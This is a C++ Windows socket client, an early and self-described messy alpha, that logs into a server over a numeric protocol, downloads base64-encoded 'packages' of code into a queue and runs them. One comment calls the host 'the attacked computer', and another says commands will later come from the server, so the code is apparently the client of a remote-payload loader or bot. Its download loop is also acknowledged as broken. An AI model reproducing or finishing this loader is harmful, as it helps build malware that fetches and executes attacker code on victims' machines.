//A sincere comment from the author of this code as of 8/3/2015, this is an alpha version, the code is still messy and needs to get a good care,
//I WILL make it more neat and clean for the beta version. Most of the functiunality in this version is working but wasn't fully tested.
#include "clientHeader.h"
using namespace std;

#define WIN32_LEAN_AND_MEAN

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 1024
#define DEFAULT_PORT "4567"
#define DEFAULT_SERVER "127.0.0.1"

int winsockInit(WSADATA* wsaData)
{
	int iResult = WSAStartup(MAKEWORD(2,2), wsaData);
    if (iResult != 0)
	{
        cout << "WSAStartup failed with error: "<< iResult << endl;
        system("PAUSE");
		return 1;
    }
	return 0;
}
bool send(string sendbuf, SOCKET ConnectSocket)
{
	// Converting the string to char* so its sendable
	char * writable = new char[sendbuf.size() + 1];
	copy(sendbuf.begin(), sendbuf.end(), writable);
	writable[sendbuf.size()] = '\0';

    int iResult = send( ConnectSocket, writable, (int)strlen(writable), 0 );
	delete[] writable;
    if (iResult == SOCKET_ERROR)
	{
        cout<< "send failed with error: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
		system("PAUSE");

        return false;
    }
	return true;
}

string receive(SOCKET ConnectSocket)
{
	int iResult = 0;
	char recvbuf[DEFAULT_BUFLEN];
	string rec = " ";
    iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
    if ( iResult > 0 )
	{
		cout <<"Bytes received:" << iResult << endl; 
		rec = (recvbuf);
	}
    else if ( iResult == 0 )
        cout << "Connection closed" << endl;
    else
		cout <<"recv failed with error: " << WSAGetLastError() << endl;
	return rec;
	
}

void splitting(string str, queue<string>* s)
{
	//this functions splits line by the delimiter ',' and pushes it by order to a stack.
	std::string delimiter = ",";

	size_t pos = 0;
	std::string token;
	while ((pos = str.find(delimiter)) != std::string::npos)
	{
		token = str.substr(0, pos);
		s->push(token.append("\n"));
		str.erase(0, pos + delimiter.length());
	}
	s->push(str.append("\n"));
}

void raiseError(string errorCode)
{
	if(errorCode.compare("901") == 0)
	{
		cout << "Error- was not accepted."<< endl;
	}
	if(errorCode.compare("902") == 0)
	{
		cout << "Error- package does not exist."<< endl;
	}
	if(errorCode.compare("903") == 0)
	{
		cout << "Error- we can not give you the package."<< endl;
	}
}

//this function is used for the login process
bool login(SOCKET ConnectSocket)
{
	bool success = false;
	std::stringstream sstring;
	string pMsg("100,"); //100 - our protocol's number for login message
	string username("default"); // deafult username
	string pass("default"); // default password
	string recvStr;

	cout << "Please enter a username: ";
	cin >> username;
	cout << "Please enter a password: ";
	cin >> pass;
	
	sstring << pMsg << "," << username << "," << pass;
	std::string sendbuf = sstring.str();
	
	success = send(sendbuf, ConnectSocket); // sending login credentials
	if(success)
	{
		recvStr = receive(ConnectSocket);
		if(recvStr.compare(("101")))
		{
			return success;
		}
		else
		{
			cout << "Login failed try again";
		}
	}
	return false;

}

string getPkgInfo(SOCKET ConnectSocket, string pkgNm)
{

		//THE END OF THE DESCRIPTION WE GET FROM SERVER MUT HAVE A PERIOD IN THE END
		queue<string> s; // used to split the message, each part seperated by ',' will enter 
						//	to the stack as a string by this order: last is code incase we have it, first is the protocol message
		string protocolCode; // the protocol code that the message holds
		string description; // the code received from the message
		string recvStr = "Error has occured"; // the deafult case is that we couldn't get the info
		string sendbuf = "102,";
		sendbuf.append(pkgNm);
		if(send(sendbuf,ConnectSocket))
		{
			recvStr = receive(ConnectSocket);
			splitting(recvStr, &s);
			protocolCode = s.front();
			s.pop();
			if(protocolCode.compare("103\n") != 0) // in this case we got some sort of an error
			{
				raiseError(protocolCode);
			}
		
			if(protocolCode.compare("103\n") == 0)
			{
				description = s.front();
				s.pop();
				recvStr = description.substr(0, description.find(".", 0));
				recvStr.append(".\n");
			}
			if(s.empty())
			{
				return recvStr;
			}
		}
	
		return recvStr;
}

string download(SOCKET ConnectSocket) // not used ATM
{
	int iResult = 0;
	char recvbuf[DEFAULT_BUFLEN * 36];
	string rec = " ";
    iResult = recv(ConnectSocket, recvbuf, DEFAULT_BUFLEN * 36, 0);
    if ( iResult > 0 )
	{
		cout <<"Bytes received:" << iResult << endl;
		rec = (recvbuf);
	}
    else if ( iResult == 0 )
        cout << "Connection closed" << endl;
    else
		cout <<"recv failed with error: " << WSAGetLastError() << endl;
	return recvbuf;
	
}

// downloading a packgage and pushing it to the package's queue
bool dwnPushPkg(SOCKET ConnectSocket, string pkgNm, PackageQue* que, Package* pack) 
{
		queue<string> s; // used to split the message, each part seperated by ',' will enter 
						//	to the stack as a string by this order: last is code incase we have it, first is the protocol message
		string sendbuf = "104,";
		string protocolCode; // the protocol code that the message holds
		string pCode = ""; // the code received from the message
		sendbuf.append(pkgNm);
		int packLen = 0;
		char temp [DEFAULT_BUFLEN * 48];
		char recvBuf [DEFAULT_BUFLEN];
		int fileSize = DEFAULT_BUFLEN *48;
		int sizeCheck = 0;
		int iResult = send(sendbuf,ConnectSocket);
		string recvStr = receive(ConnectSocket);
		splitting(recvStr, &s);

		if(s.empty())
		{
			cout << "Could not get a correct response" << endl;
			return false;
		}

		protocolCode = s.front();
		s.pop();
		if(protocolCode.compare("105\n") != 0) // in this case we got some sort of an error
		{
			raiseError(protocolCode);
			return false;
		}
		if(protocolCode.compare("105\n") == 0)
		{
			packLen = atoi(s.front().c_str());
			s.pop();
			string sendbuf = "106,";
			iResult = send(sendbuf,ConnectSocket);
			if (packLen > 0)
			{
				//string recvStr = download(ConnectSocket);

				// //pCode = recvStr.substr(0,packLen);

				//pCode = recvStr;

				//no names for packs yet, will be added to the protocol later no

				//b64String code(pCode);

				//this is where we put the code into the pack and push in into the queue
				while(sizeCheck < fileSize)
				{
					int received = recv(ConnectSocket, recvBuf, DEFAULT_BUFLEN, 0);
					pCode.append(recvBuf);
					sizeCheck += received;
					cout << "GOT " << received << endl;
					// cout << "GOT " << recvBuf << endl;
				}
				//int received = recv(ConnectSocket, temp, DEFAULT_BUFLEN * 48, 0);
				cout << "File size received " << sizeCheck << endl;
				b64String code(pCode); // This is the problematic part,
									//it says that we recived the entire file yet when we use the string it only has 3 chars
				pack->setCode(code);
				pack->setName("defaultName");
				que->insert(*pack);
				return true;
			}
			else
			{
				return false;
			}
		}
			
		cout << "Weird error has occured" << endl;
		return false;
		
}

void menu(string* pkgNm, int* pick)
{
	// right now it takes the orders from the user of the attacked computer, its only temp, will be taking them from server in future
	// taking the package id
	scanf("Please enter the package id you want to perform actions on: %s\n", pkgNm); 
	cout << "Please enter the package id you want to perform actions on: ";
	cin >> *pkgNm;
	// taking the user's action
	cout << "What would you like to do?\nPress 2 from package information \nPress 4 to request a package \nPress 1 to run 1st pack in queue\n ";  
	cin >> *pick;
	

}

int __cdecl main(int argc, char **argv) 
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
	int pick = -1;//user picks what action he wants
	string pkgNm = "-1"; //user picks the package he wants
	bool check = false; //used to check all sort of stuff like a success of a login
	string recvStr, sendbuf;
	Package pack;
	PackageQue que;

    // init winsock
	if(winsockInit(&wsaData) == 1)
		return 1;

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // init server port and address
    iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 )
	{
		cout << "getaddrinfo failed with error: " << iResult << "\n";
        WSACleanup();
		system("PAUSE");
        return 1;
    }

    // Going through few addresses and attemts to connect to them all
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next)
	{
        // Create a socket to connect to our server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET)
		{
            cout << "socket failed with error:" << WSAGetLastError() << " \n";
            WSACleanup();
			system("PAUSE");
            return 1;
        }

        // connecting to the server
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR)
		{
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET)
	{
		cout << "Unable to connect to server!\n";
        WSACleanup();
		system("PAUSE");
        return 1;
    }

	//this is where we login to the server
	
	while (check == false)
	{
		check = login(ConnectSocket);
	}
	


	menu(&pkgNm, &pick);

	if(pick == 2) // incase user wants package data
		cout << getPkgInfo(ConnectSocket, pkgNm);

	if(pick == 4) // incase user wants to downloada a package and push to queue
		dwnPushPkg(ConnectSocket, pkgNm, &que, &pack);
		que.Run_All(); // this line should'nt be here, its here just to check if the pack runs of not

	if(pick == 1)// running all packs in queue
		que.Run_All();


    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR)
	{
        cout << "shutdown failed with error: " << WSAGetLastError() << "\n";

		system("PAUSE");
        return 1;
    }



    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

	system("PAUSE");
    return 0;
}